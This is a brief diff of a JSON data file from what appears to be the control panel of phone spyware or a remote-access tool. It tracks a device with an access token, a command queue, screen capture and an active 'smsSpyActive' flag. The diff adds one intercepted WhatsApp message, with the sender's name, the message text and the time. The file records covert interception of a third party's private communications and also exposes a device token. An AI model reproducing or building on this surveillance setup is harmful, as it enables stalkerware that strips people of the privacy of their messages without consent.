@@ -146,7 +146,7 @@
     "deviceName": "HP-PEGASUS-B240",
     "ownerUsername": "Kanzun",
     "token": "5d33b8ecb200f311ed19db054f831b4d",
-    "lastSeen": 1777297048335,
+    "lastSeen": 1777297051549,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T11:02:22.793Z",
@@ -162,6 +162,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Kepin Pp",
+        "content": "akun ff e kwn sng ap",
+        "time": "27/04 20:37",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777297050117
+      },
       {
         "appName": "WhatsApp",
         "sender": "Kepin Pp",
